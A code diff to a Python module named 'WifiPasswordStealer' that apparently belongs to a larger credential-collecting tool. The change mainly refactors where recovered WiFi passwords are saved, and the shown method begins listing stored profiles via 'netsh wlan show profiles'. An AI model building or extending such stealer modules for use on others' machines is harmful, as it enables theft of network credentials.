@@ -7,7 +7,7 @@ from config import ModuleManager
 
 class WifiPasswordRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name="WifiPasswordStealer")
+        super().__init__(module_name="WifiPasswordStealer", module_path="network/wifi")
         self.banner(r"""
      _______         _  _  _ _       _______ _ 
     |.-----.|       (_)(_)(_|_)     (_______|_)
@@ -19,11 +19,9 @@ class WifiPasswordRecovery(ModuleManager):
   `-=========-`()            Passwords
                     """)
         
-        self.systeminfo_folder: Path = self.output_folder_user / "network"
-        self.wifi_passwords_filename: Path = self.systeminfo_folder / "wifi_passwords.txt"
-        
-        self.systeminfo_folder.mkdir(parents=True, exist_ok=True)
-    
+        self.wifi_passwords_filename: Path = self.module_output / "wifi_passwords.txt"
+
+
     def _get_wifi_profiles(self) -> list[str]:
         """Get all available WiFi profiles."""
         self.mdebug(f"Running command: `netsh wlan show profiles`")
